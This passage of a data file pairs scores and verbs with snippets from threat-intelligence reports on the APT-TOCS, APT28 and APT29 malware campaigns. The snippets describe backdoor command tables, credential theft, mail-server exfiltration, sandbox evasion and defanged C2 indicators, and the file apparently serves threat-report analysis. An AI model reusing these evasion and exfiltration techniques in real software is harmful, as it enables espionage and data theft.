accessing system passwords and so on")(0.5, 'importing', "                                                               Page 10 </footer>\n\n<header> \x0c                                  Analysis on APT-to-be Attack That Focusing on China's Government Agency </header>\n\n\n\n\n                              <figure></figure> <caption> Figure 16 Comparison of module 3 data package </caption>\n\n\n3.4 Characteristics of Cobalt Strike\n\nUsing Cobalt Strike attack can execute various operations in the targeted systems, such as downloading and\nuploading files, executing designated programs, injecting keyboard recorder, executing commands via PowerShell,\nimporting PowerShell script, executing commands via CMD, accessing system passwords and so on")(0.6666666666666666, 'downloading', "                                                               Page 10 </footer>\n\n<header> \x0c                                  Analysis on APT-to-be Attack That Focusing on China's Government Agency </header>\n\n\n\n\n                              <figure></figure> <caption> Figure 16 Comparison of module 3 data package </caption>\n\n\n3.4 Characteristics of Cobalt Strike\n\nUsing Cobalt Strike attack can execute various operations in the targeted systems, such as downloading and\nuploading files, executing designated programs, injecting keyboard recorder, executing commands via PowerShell,\nimporting PowerShell script, executing commands via CMD, accessing system passwords and so on")(0.42105263157894735, 'use', '\nHere we can see both of them use Cookie to transmit information that has been encrypted, and send requests\nactively every 60 seconds')(1.0, 'send', '\nHere we can see both of them use Cookie to transmit information that has been encrypted, and send requests\nactively every 60 seconds')(0.6666666666666666, 'evade', ' This kind of attack pattern disguising as non-malicious real file in the host of its\ntarget, it sending a network heartbeat package every 60 seconds, and it also send data information via the Cookie\nfield, all these features of this attack pattern are designed to evade the detection of security software and the\ninterception of firewall on the targeted host')(1.0, 'sending', ' This kind of attack pattern disguising as non-malicious real file in the host of its\ntarget, it sending a network heartbeat package every 60 seconds, and it also send data information via the Cookie\nfield, all these features of this attack pattern are designed to evade the detection of security software and the\ninterception of firewall on the targeted host')(0.5, 'send', ' This kind of attack pattern disguising as non-malicious real file in the host of its\ntarget, it sending a network heartbeat package every 60 seconds, and it also send data information via the Cookie\nfield, all these features of this attack pattern are designed to evade the detection of security software and the\ninterception of firewall on the targeted host')(0.625, 'realize', '\n</section>\n\n<section>\n<heading> 2 Analysis on incident sample </heading>\n\n\n2.1 Leading files and sample downloading\n\nAPT-TOCS used “powershell.exe” to execute Shellcode scripts to realize remote control on targeted system')(0.7333333333333333, 'send', '\n\nJudging from the module strings and the system functions, the module belongs to backdoor program that can send\nGET request to designated addresses and heartbeat packages by using Cookie fields with 60 seconds’ interval')(0.5, 'conceal', '\n\nThe reason why the CERT Analysis Team of ANTIY classified APT-TOCS into APT incidents is that it’s a kind of\ntargeted attack (one of the features of APT attack), it has anti-detection functions and also it can conceal itself')(1.0, 'has', '\n\nThe reason why the CERT Analysis Team of ANTIY classified APT-TOCS into APT incidents is that it’s a kind of\ntargeted attack (one of the features of APT attack), it has anti-detection functions and also it can conceal itself')(0.7142857142857143, 'downloads', '\n\nThe core step of APT-TOCS is downloading the script functionalities of Shellcode, which downloads a field of data\ninto memory for operation by calling powershell.exe.The decrypted data is a field of executable Shellcode that is\ngenerated by Cobalt Strike (An automatic attack testing platform)')(0.16666666666666666, 'writing', "                                                                       Page 3 </footer>\n\n\n<header> \x0c                                Analysis on APT-to-be Attack That Focusing on China's Government Agency </header>\n\n\n\n\n                                    <figure></figure>    <caption> Figure 5 Content of script 1 </caption>\n\nThe functionality of this part is: decrypting data with base64 encryption and getting module 1, then writing to\nprocess powershell.exe, and executing and operating")(0.8333333333333334, 'connected', ' This implant\n             connected to a C2 node that overlapped with prennera[.]com')(0.8181818181818182, 'receives', ' The SOURFACE\ndownloader then receives another dropper from its C2 server, and\nthis second dropper installs a second stage backdoor, which is\nusually EVILTOSS')(0.5, 'installs', ' The SOURFACE\ndownloader then receives another dropper from its C2 server, and\nthis second dropper installs a second stage backdoor, which is\nusually EVILTOSS')(0.9230769230769231, 'send', ' They may send spear phishing emails from\na specific IP address or email address')(1.0, 'steal', ' They steal data by configuring their\n       implants to send data out of the network using a victim\n       network’s mail server')(0.13333333333333333, 'send', ' They steal data by configuring their\n       implants to send data out of the network using a victim\n       network’s mail server')(0.8, 'obtains', ' This downloader obtains a\n     second-stage backdoor from a C2 server')(0.6666666666666666, 'gain', ' They work together         \nto gain access to their targets and steal data')(0.5, 'steal', ' They work together         \nto gain access to their targets and steal data')(0.75, 'using', '    Communications with a C2 server using\n      HTTP')(0.7272727272727273, 'communicate', ' The backdoor attempted to\nestablish a connection to a Georgian MIA mail\nserver and communicate via MIA email addresses\nending with “@mia.ge.gov”')(1.0, 'establish', ' The backdoor attempted to\nestablish a connection to a Georgian MIA mail\nserver and communicate via MIA email addresses\nending with “@mia.ge.gov”')(0.75, 'logged', ' User activity is captured once every 500 milliseconds and logged in\nan HTML-like format')(0.4166666666666667, 'contain', ' Messages are sent using HTTP\nPOST requests whose bodies contain encrypted\nand Base64 encoded data')(1.0, 'registered', '\n\nAPT28 has registered domains similar to those of                      \nlegitimate Eastern European news sites and                            \ngovernments, listed in Table 2')(0.3333333333333333, 'uses', '\n</footnote>\n\n<footer>37 fireeye.com</footer>\n\x0c\n<header>APT 28: A Window into Russia’s Cyber Espionage Operations?</header>\n\n\n\n\nCHOPSTICK uses a URL-safe Base64 encoding, using an alphabet that substitutes “+” and “/” for “-” and\n“_”, respectively')(0.37037037037037035, 'are', '                          \n                                                        \nSome of APT28’s more commonly used tools are            \nthe SOURFACE downloader, its second stage               \nbackdoor EVILTOSS, and a modular family of              \nimplants that we call CHOPSTICK')(0.21428571428571427, 'gain', '\n•    EVILTOSS: This backdoor has been delivered\n     through the SOURFACE downloader to gain\n     system access for reconnaissance,\n     monitoring, credential theft, and shellcode\n     execution')(0.6153846153846154, 'encode', ' These families             \nencode their strings at compile time using a      \ncustom stream cipher')(0.5454545454545454, 'obtains', '\n</section>\n\n<footer>29 fireeye.com</footer>\n\x0c\n<header>APT 28: A Window into Russia’s Cyber Espionage Operations?</header>\n\n\n<section>\n<heading>APPENDIX B:\nTIMELINE OF\nAPT28 LURES</heading>\n\n\n\n<table>\n YEAR LURE TOPIC                                                                                            MALWARE\n 2010      Iran’s work with an international organization (internal document)                               SOURFACE\n\n                                                                                                            SOURFACE,\n 2011      File named “military cooperation.doc”\n                                                                                                            OLDBAIT\n\n 2011      Georgian language IT document for Ministry of Internal Affairs (internal document)               SOURFACE\n\n           “USB Disk Security is the best software to block threats that can damage your PC or compromise\n 2011                                                                                                       SOURFACE\n           your personal information via USB storage.”\n 2012      Food security in Africa (“Food and nutrition crisis reaches peak but good forecast for 2013”)    SOURFACE\n\n 2012      “IDF Soldier Killed and another injured in a Terror Attack”                                      SOURFACE\n\n 2012      “Echo Crisis Report” on Portugal’s forest fires                                                  SOURFACE\n\n 2012      “FBI to monitor Facebook, Twitter, Myspace”                                                      SOURFACE\n\n 2012      Georgia (US state, not the country of Georgia) murder case uncovers terror plot                  SOURFACE\n\n 2012      Military attaches in London (internal document)                                                  SOURFACE\n\n                                                                                                            CHOPSTICK,\n 2013      South Africa MFA document\n                                                                                                            CORESHELL\n\n 2013      John Shalikashvili (Georgian-Polish-American US General) Questionnaire                           CORESHELL\n\n 2013      Asia Pacific Economic Cooperation Summit 2013 reporters (internal document)                      SOURFACE\n\n                                                                                                            CHOPSTICK,\n 2013      Defense Attaches in Turkey (internal document)\n                                                                                                            CORESHELL\n                                                                                                            CHOPSTICK,\n 2013      Turkish Cypriot news about Syria chemical weapons\n                                                                                                            CORESHELL\n\n 2013      Georgian language document about drivers’ licenses (internal document)                           EVILTOSS\n\n 2013      Apparent Reason Magazine-related lure sent to a journalist                                       CORESHELL\n\n 2014      Mandarin language document, possibly related to a Chinese aviation group (non-public document)   CORESHELL\n\n 2014      Netherlands-Malaysia cessation of hostilities; related to Ukraine airline attack                 CORESHELL\n</table>\n</section>\n\n<footer>30 fireeye.com</footer>\n\x0c\n<header>APT 28: A Window into Russia’s Cyber Espionage Operations?</header>\n\n\n<section>\n<heading>APPENDIX C:\nSOURFACE/CORESHELL</heading>\n\n\n\n\nSOURFACE is a downloader that obtains a second        \nstage backdoor from a C2 server')(0.3333333333333333, 'is', '\n</section>\n\n<footer>29 fireeye.com</footer>\n\x0c\n<header>APT 28: A Window into Russia’s Cyber Espionage Operations?</header>\n\n\n<section>\n<heading>APPENDIX B:\nTIMELINE OF\nAPT28 LURES</heading>\n\n\n\n<table>\n YEAR LURE TOPIC                                                                                            MALWARE\n 2010      Iran’s work with an international organization (internal document)                               SOURFACE\n\n                                                                                                            SOURFACE,\n 2011      File named “military cooperation.doc”\n                                                                                                            OLDBAIT\n\n 2011      Georgian language IT document for Ministry of Internal Affairs (internal document)               SOURFACE\n\n           “USB Disk Security is the best software to block threats that can damage your PC or compromise\n 2011                                                                                                       SOURFACE\n           your personal information via USB storage.”\n 2012      Food security in Africa (“Food and nutrition crisis reaches peak but good forecast for 2013”)    SOURFACE\n\n 2012      “IDF Soldier Killed and another injured in a Terror Attack”                                      SOURFACE\n\n 2012      “Echo Crisis Report” on Portugal’s forest fires                                                  SOURFACE\n\n 2012      “FBI to monitor Facebook, Twitter, Myspace”                                                      SOURFACE\n\n 2012      Georgia (US state, not the country of Georgia) murder case uncovers terror plot                  SOURFACE\n\n 2012      Military attaches in London (internal document)                                                  SOURFACE\n\n                                                                                                            CHOPSTICK,\n 2013      South Africa MFA document\n                                                                                                            CORESHELL\n\n 2013      John Shalikashvili (Georgian-Polish-American US General) Questionnaire                           CORESHELL\n\n 2013      Asia Pacific Economic Cooperation Summit 2013 reporters (internal document)                      SOURFACE\n\n                                                                                                            CHOPSTICK,\n 2013      Defense Attaches in Turkey (internal document)\n                                                                                                            CORESHELL\n                                                                                                            CHOPSTICK,\n 2013      Turkish Cypriot news about Syria chemical weapons\n                                                                                                            CORESHELL\n\n 2013      Georgian language document about drivers’ licenses (internal document)                           EVILTOSS\n\n 2013      Apparent Reason Magazine-related lure sent to a journalist                                       CORESHELL\n\n 2014      Mandarin language document, possibly related to a Chinese aviation group (non-public document)   CORESHELL\n\n 2014      Netherlands-Malaysia cessation of hostilities; related to Ukraine airline attack                 CORESHELL\n</table>\n</section>\n\n<footer>30 fireeye.com</footer>\n\x0c\n<header>APT 28: A Window into Russia’s Cyber Espionage Operations?</header>\n\n\n<section>\n<heading>APPENDIX C:\nSOURFACE/CORESHELL</heading>\n\n\n\n\nSOURFACE is a downloader that obtains a second        \nstage backdoor from a C2 server')(0.4, 'employed', ' A SOURFACE sample employed\n      in the same Malaysia Airlines lure was\n      referenced by a Polish computer security\n      company in a blog post.<fn>12</fn> The Polish security\n      company indicated that the sample was “sent\n      to the government,” presumably the Polish\n      government, given the company’s location\n      and visibility')(1.0, 'used', ' Until 2013, the\nSOURFACE downloader used hard-coded IP\naddresses for C2 communications, whereas the\nfuture CORESHELL samples use domains')(0.5714285714285714, 'use', ' Until 2013, the\nSOURFACE downloader used hard-coded IP\naddresses for C2 communications, whereas the\nfuture CORESHELL samples use domains')(1.0, 'attaches', ' The backdoor attaches this file to a\n preformatted email and sends it out through a\n victim’s mail server')(0.18181818181818182, 'sends', ' The backdoor attaches this file to a\n preformatted email and sends it out through a\n victim’s mail server')(0.8181818181818182, 'installed', ' In the background,\nthe decoy document installed a SOURFACE\nbackdoor on the victim’s system')(0.6363636363636364, 'obtain', '\nThis tactic could allow APT28 to obtain data from\nthe MIA’s network through a less-monitored\nroute, limiting the MIA network security\ndepartment’s abilities to detect the traffic')(0.7272727272727273, 'limiting', '\nThis tactic could allow APT28 to obtain data from\nthe MIA’s network through a less-monitored\nroute, limiting the MIA network security\ndepartment’s abilities to detect the traffic')(1.0, 'imitated', '\n\nSeveral of the domains APT28 registered imitated\nNATO domain names, including those of NATO\nSpecial Operations Headquarters and the NATO\nFuture Forces Exhibition')(0.375, 'capturing', ' It creates a thread that records user activity on the host, capturing desktop\nscreenshots in JPEG format, tracks current window focus, collects keystrokes, and scrapes window\ncontents (text, context menus, etc.)')(0.0625, 'collects', ' It creates a thread that records user activity on the host, capturing desktop\nscreenshots in JPEG format, tracks current window focus, collects keystrokes, and scrapes window\ncontents (text, context menus, etc.)')(0.16666666666666666, 'tracks', ' It creates a thread that records user activity on the host, capturing desktop\nscreenshots in JPEG format, tracks current window focus, collects keystrokes, and scrapes window\ncontents (text, context menus, etc.)')(0.625, 'records', ' It creates a thread that records user activity on the host, capturing desktop\nscreenshots in JPEG format, tracks current window focus, collects keystrokes, and scrapes window\ncontents (text, context menus, etc.)')(0.13636363636363635, 'scrapes', ' It creates a thread that records user activity on the host, capturing desktop\nscreenshots in JPEG format, tracks current window focus, collects keystrokes, and scrapes window\ncontents (text, context menus, etc.)')(0.12903225806451613, 'creates', ' It creates a thread that records user activity on the host, capturing desktop\nscreenshots in JPEG format, tracks current window focus, collects keystrokes, and scrapes window\ncontents (text, context menus, etc.)')(0.36363636363636365, 'crafted', ' APT28 possibly crafted this document    \nto appear legitimate to all MIA system users and   \nintended to breach the MIA network specifically    \nusing the embedded malware')(0.7037037037037037, 'used', '\n\n•     More recently, in August 2014 APT28 used a\n      lure (Figure 3) about hostilities surrounding a\n      Malaysia Airlines flight downed in Ukraine in\n      a probable attempt to compromise the Polish\n      government')(0.8571428571428571, 'sending', ' After sending an initial HTTP GET request it uploads the file contents of edg6EF885E2')(0.5384615384615384, 'target', ' One APT28 domain imitated a key\nChechen-focused news website, while the other\nappeared to target members of the Armenian\nmilitary by hosting a fake login page')(1.0, 'imitated', ' One APT28 domain imitated a key\nChechen-focused news website, while the other\nappeared to target members of the Armenian\nmilitary by hosting a fake login page')(0.4, 'stores', ' CHOPSTICK reads messages from the mailslot, encrypts them using RC4, and then stores the\nencrypted message in an edg6EF885E2.tmp temporary file')(0.23809523809523808, 'reads', ' CHOPSTICK reads messages from the mailslot, encrypts them using RC4, and then stores the\nencrypted message in an edg6EF885E2.tmp temporary file')(0.8571428571428571, 'register', '\nJournalists critical of the Kremlin have long\nbeen targets of surveillance and harassment,\nand a number of governments and human\nrights organizations have publicly criticized the\ngovernment for its treatment of journalists and its\nincreasing consolidation of control over the media.<fn>9</fn>\n</section>\n\n<section>\n<heading>APT28’s Other Targets in the Caucasus</heading>\nWe have seen APT28 register at least two\ndomains mimicking the domains of legitimate\norganizations in the Caucasus, as shown in the\ntable below')(0.7777777777777778, 'write', ' Web Enterprise Security\nMBAMService                                          Malwarebytes Anti-Malware\n</table>\n\n\n\n<footer>35 fireeye.com</footer>\n\x0c\n<header>APT 28: A Window into Russia’s Cyber Espionage Operations?</header>\n\n\n\n\n <caption>Table 10: Applications detected by CHOPSTICK</caption>\n\n<table>\n\n Process Name\t                                               Application\n\n firefox.exe                                                 Mozilla Firefox\n iexplore.exe                                                Internet Explorer\n outlook.exe                                                 Microsoft Outlook\n opera.exe                                                   Opera Browser\n bat.exe                                                     Unknown\n msimn.exe                                                   Outlook Express\n vpngui.exe                                                  Cisco Anyconnect VPN client\n ipseca.exe                                                  IPsec VPN client\n ipsecc.exe                                                  IPsec VPN client\n openvpn.exe                                                 OpenVPN client\n openssl.exe                                                 OpenSSL\n openvpn-gui-1.0.3.exe                                       OpenVPN client\n msmsgs.exe                                                  Microsoft Messenger\n wuauclt.exe                                                 Windows Update\n chrome.exe                                                  Google Chrome Browser\n thebat.exe                                                  The Bat Secure Email Client\n skype.exe                                                   Skype Messenger\n</table>\n\n\n\n<footer>36 fireeye.com</footer>\n\x0c\n<header>APT 28: A Window into Russia’s Cyber Espionage Operations?</header>\n\n\n\n\nAfter collecting host information, CHOPSTICK creates a hidden file that may be named\n%ALLUSERSPROFILE%\\edg6EF885E2.tmp for temporary storage and creates a Windows mailslot with the\nname “check_mes_v5555”.<fn>28</fn> Its usage of a Windows mailslot would potentially allow external binaries to\nwrite data to the “check_mes_v5555” mailslot, possibly allowing CHOPSTICK to encrypt and store\noutput from other malware')(0.7368421052631579, 'use', ' Two of the malware            \nfamilies (SOURFACE/CORESHELL and                  \nEVILTOSS) use the same decryption                 \nsequence and similar algorithms for string        \nencoding and decoding')(0.6, 'received', ' The backdoor sent data via\nSMTP to nato_smtp@mail[.]ru and received its\ntasking via POP from nato_pop@mail[.]ru')(0.75, 'sent', ' The backdoor sent data via\nSMTP to nato_smtp@mail[.]ru and received its\ntasking via POP from nato_pop@mail[.]ru')(0.46153846153846156, 'imitated', ' Some of the APT28-\nregistered domains imitated those of defense          \nevents held in Europe, such as the Farnborough        \nAirshow 2014, EuroNaval 2014, EUROSATORY              \n2014, and the Counter Terror Expo')(0.8888888888888888, 'hinder', ' This would\n     hinder static analysis of CORESHELL behavior\n     by creating a large amount of unnecessary\n     noise in the disassembly')(0.5789473684210527, 'tests', ' It also tests for the installation of specific security\nproducts (Table 9) and applications (Table 10)')(0.2727272727272727, 'communicating', '\n\nAfter approximately 60 seconds of execution time, CHOPSTICK begins communicating with one of its C2\nservers over HTTP')(0.5714285714285714, 'routing', '\n      One variant of CHOPSTICK focuses on\n      apparent air gap / closed network capabilities\n      by routing messages between local\n      directories, the registry and USB drives')(0.8181818181818182, 'uses', '                                 \n                                                      \nCORESHELL uses two threads to communicate             \nwith its C2 server')(0.4166666666666667, 'is', '\n\n\n   <caption>Table 14: Commands understood by modFS (0x1101) module</caption>\n\n<table>\n\n   Command ID\t             Description         Example\n\n   01                      Find file           \\x01\\x11\\x01Directory&file&[01]\n\n   02                      Read file           \\x01\\x11\\x02Directory&file&[01]\n   03                      Write file          \\x01\\x11\\x03Directory&file&[Contents]\n\n   04                      Delete file         \\x01\\x11\\x04Directory&file&[01]\n   05                      Execute file        \\x01\\x11\\x05Directory&file&[01]\n\n</table>\n\n   <caption>Table 15: Commands understood by modProcRet (0x1301) module</caption>\n\n<table>\n\n   Command ID\t             Description         Example\n\n   00                      CMD.exe output      \\x01\\x13\\x00[Output]\n\n   01                      CMD.exe start       \\x01\\x13\\x01\n   02                      CMD.exe exit        \\x01\\x13\\x02\n\n   11                      CMD.exe input       \\x01\\x13\\x11[Input]\n</table>\n</section>\n\n<footer>42 fireeye.com</footer>\n\x0c\n<header>APT 28: A Window into Russia’s Cyber Espionage Operations?</header>\n\n\n<section>\n<heading>APPENDIX E:\nOLDBAIT</heading>\n\n\n\n\nOLDBAIT is a credential harvester that installs itself in %ALLUSERPROFILE%\\\\Application Data\\\nMicrosoft\\MediaPlayer\\updatewindws.exe')(0.2, 'installs', '\n\n\n   <caption>Table 14: Commands understood by modFS (0x1101) module</caption>\n\n<table>\n\n   Command ID\t             Description         Example\n\n   01                      Find file           \\x01\\x11\\x01Directory&file&[01]\n\n   02                      Read file           \\x01\\x11\\x02Directory&file&[01]\n   03                      Write file          \\x01\\x11\\x03Directory&file&[Contents]\n\n   04                      Delete file         \\x01\\x11\\x04Directory&file&[01]\n   05                      Execute file        \\x01\\x11\\x05Directory&file&[01]\n\n</table>\n\n   <caption>Table 15: Commands understood by modProcRet (0x1301) module</caption>\n\n<table>\n\n   Command ID\t             Description         Example\n\n   00                      CMD.exe output      \\x01\\x13\\x00[Output]\n\n   01                      CMD.exe start       \\x01\\x13\\x01\n   02                      CMD.exe exit        \\x01\\x13\\x02\n\n   11                      CMD.exe input       \\x01\\x13\\x11[Input]\n</table>\n</section>\n\n<footer>42 fireeye.com</footer>\n\x0c\n<header>APT 28: A Window into Russia’s Cyber Espionage Operations?</header>\n\n\n<section>\n<heading>APPENDIX E:\nOLDBAIT</heading>\n\n\n\n\nOLDBAIT is a credential harvester that installs itself in %ALLUSERPROFILE%\\\\Application Data\\\nMicrosoft\\MediaPlayer\\updatewindws.exe')(0.8571428571428571, 'sends', ' The first thread sends beacons    \nthat contain the process listing of the               \ncompromised host')(0.375, 'used', '                       \n\nSince 2011, APT28 has used lures written in\nGeorgian that are probably intended to target\nGeorgian government agencies or citizens')(0.36363636363636365, 'collecting', '\n      One CHOPSTICK v1 variant contained\n      modules and functions for collecting\n      keystroke logs, Microsoft Office documents,\n      and PGP files')(0.29411764705882354, 'used', ' APT28 used a lure\ndocument that installed a SOURFACE downloader\n(further discussed in the Malware section) and\ncontained a listing of birthdays for members of a\nworking group between the Georgian MOD and\nthe U.S')(0.8, 'contained', ' APT28 used a lure\ndocument that installed a SOURFACE downloader\n(further discussed in the Malware section) and\ncontained a listing of birthdays for members of a\nworking group between the Georgian MOD and\nthe U.S')(0.42857142857142855, 'installed', ' APT28 used a lure\ndocument that installed a SOURFACE downloader\n(further discussed in the Malware section) and\ncontained a listing of birthdays for members of a\nworking group between the Georgian MOD and\nthe U.S')(0.6190476190476191, 'used', ' It\n      used one of four embedded sender email\n      addresses (@mia.gov.ge) to send files via\n      email to another email address on the same\n      mail server')(0.6428571428571429, 'includes', '             \n                                                     \nAPT28 has attempted to obfuscate their code and      \nimplement counter-analysis techniques:  \n\n•    One of the latest samples of CORESHELL\n     includes counter-reverse engineering tactics\n     via unused machine instructions')(1.0, 'implement', '             \n                                                     \nAPT28 has attempted to obfuscate their code and      \nimplement counter-analysis techniques:  \n\n•    One of the latest samples of CORESHELL\n     includes counter-reverse engineering tactics\n     via unused machine instructions')(0.8571428571428571, 'crafts', '                     \n                                                     \nAPT28 uses spearphishing emails to target its                                                  \nvictims, a common tactic in which the threat group   \ncrafts its emails to mention specific topics (lures) \nrelevant to recipients')(0.3333333333333333, 'uses', '                     \n                                                     \nAPT28 uses spearphishing emails to target its                                                  \nvictims, a common tactic in which the threat group   \ncrafts its emails to mention specific topics (lures) \nrelevant to recipients')(0.64, 'contains', '\nThe decoy document also contains metadata listing\n“MIA” as the company name and “Beka Nozadze”<fn>4</fn>\nas an author, a possible reference to a system\nadministrator in Tbilisi')(0.16666666666666666, 'downloading', ' The second thread is                \nresponsible for downloading and executing stage\ntwo payloads')(0.14285714285714285, 'executing', ' The second thread is                \nresponsible for downloading and executing stage\ntwo payloads')(0.5, 'uploading', '\n\nAfter uploading edg6EF885E2.tmp, CHOPSTICK continues to query its C2 servers for commands using\nHTTP GET requests')(0.5833333333333334, 'query', '\n\nAfter uploading edg6EF885E2.tmp, CHOPSTICK continues to query its C2 servers for commands using\nHTTP GET requests')(0.3333333333333333, 'refer', ' However because we have\n     observed the name “Sofacy” used to refer to\n     APT28 malware generally (to include the\n     SOURFACE dropper, EVILTOSS,\n     CHOPSTICK, and the credential harvester\n     OLDBAIT), we are using the name\n     SOURFACE to precisely refer to a specific\n     downloader')(0.4666666666666667, 'used', ' In late 2013, APT28 used a lure\nthat contained a letter addressing a journalist by\nhis first name and claiming to originate from a\n“Chief Coordinator” in Reason Magazine’s\n“Caucasian Issues Department” - a division that\ndoes not appear to exist.<fn>6</fn> (Reason Magazine is a\nUS-based magazine) The letter welcomed the\nindividual as a contributor and requested topic\nideas and identification information in order to\nestablish him at the magazine')(0.23529411764705882, 'employed', '                   \n•\t    APT28 has employed RSA encryption to              \n      protect files and stolen information moved        \n      from the victim’s network to the controller')(0.4, 'installs', '\nThe ecosystem surrounding the SOURFACE downloader frequently\nconsists of a dropper, which installs SOURFACE')(0.625, 'uses', '                                         \n                                                                                   \n                                                                                   \n                                                                                   \n                                                                                   \n\n\n\nDuring our research, we discovered that       \nAPT28 uses a backdoor developed using a      \nmodular framework')(0.8888888888888888, 'provide', ' However, it contains more                               \n capabilities, including the ability to provide access                  \n to the file system and registry, enumerate network                     \n resources, create processes, log keystrokes, access                    \n stored credentials, and execute shellcode')(0.125, 'log', ' However, it contains more                               \n capabilities, including the ability to provide access                  \n to the file system and registry, enumerate network                     \n resources, create processes, log keystrokes, access                    \n stored credentials, and execute shellcode')(0.25, 'execute', ' However, it contains more                               \n capabilities, including the ability to provide access                  \n to the file system and registry, enumerate network                     \n resources, create processes, log keystrokes, access                    \n stored credentials, and execute shellcode')(0.6666666666666666, 'create', ' However, it contains more                               \n capabilities, including the ability to provide access                  \n to the file system and registry, enumerate network                     \n resources, create processes, log keystrokes, access                    \n stored credentials, and execute shellcode')(0.8666666666666667, 'writes', ' The thread writes user activity log messages to the “check_mes_v5555” mailslot in\nplain text')(0.6666666666666666, 'identify', '\n  •     Several of APT28’s malware samples contain counter-\n       analysis capabilities including runtime checks to\n       identify an analysis environment, obfuscated strings\n       unpacked at runtime, and the inclusion of unused\n       machine instructions to slow analysis')(0.5294117647058824, 'contain', '\n  •     Several of APT28’s malware samples contain counter-\n       analysis capabilities including runtime checks to\n       identify an analysis environment, obfuscated strings\n       unpacked at runtime, and the inclusion of unused\n       machine instructions to slow analysis')(0.125, 'slow', '\n  •     Several of APT28’s malware samples contain counter-\n       analysis capabilities including runtime checks to\n       identify an analysis environment, obfuscated strings\n       unpacked at runtime, and the inclusion of unused\n       machine instructions to slow analysis')(1.0, 'determine', '\n•    A number of CORESHELL droppers also\n     conduct runtime checks, attempting to\n     determine if they are executing in an analysis\n     environment, and if so, they do not trigger\n     their payloads')(0.8888888888888888, 'conduct', '\n•    A number of CORESHELL droppers also\n     conduct runtime checks, attempting to\n     determine if they are executing in an analysis\n     environment, and if so, they do not trigger\n     their payloads')(0.5, 'collects', '\n\nCHOPSTICK collects detailed information from the host including the Windows version, CPU\narchitecture, Windows Firewall state, User Account Control (UAC) configuration settings on Windows\nVista and above and Internet Explorer settings')(0.3333333333333333, 'is', '\n</table>\n</section>\n\n\n<footer>34 fireeye.com</footer>\n\x0c\n<header>APT 28: A Window into Russia’s Cyber Espionage Operations?</header>\n\n\n<section>\n<heading>APPENDIX D:\nCHOPSTICK</heading>\n\n\n\n\nCHOPSTICK is a backdoor that uses a modularized, object-oriented framework written in C++')(0.14285714285714285, 'validate', ' Once these characters are removed the decoded (but\nstill encrypted) text looks like this:\n<list>\n00000000 72 11 fd 22 f8 dc 33 9e 5e 40 24 db 31 b5 40 53 r..”..3.^@$.1.@S\n00000010 b9 91 d0 82 ba a4 d3 ab 6c 5a 05 ec 1a f4 3e 2f ........lZ....>/\n00000020 ff d2 ed d2 7f 53 a1 df 4f c7 b9 fa 87 88 35 .....S..O.....5\n</list>\n\nThe first two words (“72 11” and “fd 22”) are checksums that are used to validate the message')(0.7619047619047619, 'use', ' EVILTOSS variants may use the                         \n Simple Mail Transfer Protocol (SMTP) to send                           \n stolen data in an attachment named “detaluri')(0.8666666666666667, 'presented', ' The lure consisted of a                                  \nweaponized Excel file that presented a decoy                                \ndocument containing a list of Georgian driver’s                             \nlicense numbers')(0.5769230769230769, 'used', '\n\nIn the second example of MIA targeting, an APT28\nlure used an information technology-themed decoy\ndocument that included references to the Windows\ndomain “MIA Users\\Ortachala…” (Figure 1)')(0.2222222222222222, 'load', ' The malware contains code which allows it to load or memory-map external modules\nthat export the following functions: SendRawPacket, GetRawPacket, InitializeExp, DestroyExp,\nIsActiveChannel, GetChannelInfo, SetChannelInfo, Run, GetModuleInfo, GiveMessage,\nand TakeMessage')(0.8666666666666667, 'registered', ' In September       \n2014, APT28 registered a domain (smigroup-            \nonline.co[.]uk) that appeared to mimic that for the   \nSMi Group, a company that plans events for the\n“Defence, Security, Energy, Utilities, Finance and\nPharmaceutical sectors.” Among other events, the\nSMi Group is currently planning a military satellite\ncommunications event for November 2014')(0.6875, 'used', '\n\n\n\n<caption>\n   Figure 4: Decoy\n   document used\n   against military\n   attaches in 2012\n</caption>\n\n<figure></figure>\n\n\nFinally, APT28 used a lure that contained an apparent\nnon-public listing of contact information for defense\nattachés in the “Ankara Military Attaché Corps (AMAC),”\nwhich appears to be a professional organization of\ndefense attachés in Turkey')(0.8, 'identify', ' The purpose of this parameter\nappears to be to uniquely identify the particular instance of the backdoor to the C2 server')(0.8, 'communicate', '\nCHOPSTICK may communicate with external servers using SMTP or HTTP')(0.7333333333333333, 'target', '\n\n<heading>APT28 Targeting a Journalist Covering\nthe Caucasus</heading>\n\nAnother one of APT28’s lures appeared to target\na specific journalist covering issues in the\nCaucasus region')(0.8, 'use', ' We have also noted that         \nAPT28 tailors implants to their target               \nenvironments, configuring them to use local          \nnetwork resources such as email servers')(0.2857142857142857, 'sent', '    Email sent through a specified mail server')(0.8, 'attached', ' Once connected to the\nmail server, APT28’s backdoor sent an email\nmessage using a subject line related to driver’s\nlicenses (in Georgian), and attached a file\ncontaining system reconnaissance information')(0.375, 'sent', ' Once connected to the\nmail server, APT28’s backdoor sent an email\nmessage using a subject line related to driver’s\nlicenses (in Georgian), and attached a file\ncontaining system reconnaissance information')(0.3, 'disguise', ' In one case, we identified an                               \nAPT28 lure from mid-2013 that referenced                                    \nMIA-related topics and employed malware that                                \nattempted to disguise its activity as legitimate                            \nMIA email traffic')(0.65, 'containing', ' We identified\nan APT28 lure containing a decoy document with a list\nof British officers and U.S')(0.7, 'retrieve', '\nWe call SOURFACE (samples are frequently\nnamed netids.dll) a first stage downloader\nbecause its primary job is to retrieve a second\nstage payload from a C2 server')(0.6363636363636364, 'uploading', ' Figure 13\nbelow contains an example of an HTTP POST request uploading a segment from edg6EF885E2.tmp')(0.8947368421052632, 'used', '                                                 \n                                                                      \nIn addition, APT28 used one domain for command                        \nand control sessions (baltichost[.]org) that was                      \nthemed after the Baltic Host exercises')(0.4, 'avoid', '\n</list>\n\n APT29: AN ADAPTIVE AND DISCIPLINED\n THREAT GROUP\n HAMMERTOSS illustrates APT29’s ability to adapt\n quickly during operations to avoid detection and\n removal')(0.3157894736842105, 'upload', '        \n                                                           \nIn several cases, the commands directed\n                                                           \nHAMMERTOSS to upload information from\n                                                           \nvictim networks to accounts on cloud storage\nservices using login credentials received in\nStage 4')(0.6666666666666666, 'upload', ' In our GitHub example, the decrypted\ndata instructed the backdoor to obtain a list of\nrunning tasks—reconnaissance on the victim\nnetwork—and upload it to a specific account on a\ncloud storage service using the login credentials')(0.5555555555555556, 'obtain', ' In our GitHub example, the decrypted\ndata instructed the backdoor to obtain a list of\nrunning tasks—reconnaissance on the victim\nnetwork—and upload it to a specific account on a\ncloud storage service using the login credentials')(0.5, 'execute', '\n\n</figure>\n\n <caption> Figure 6: Executing Commands and Removing Data </caption>                                        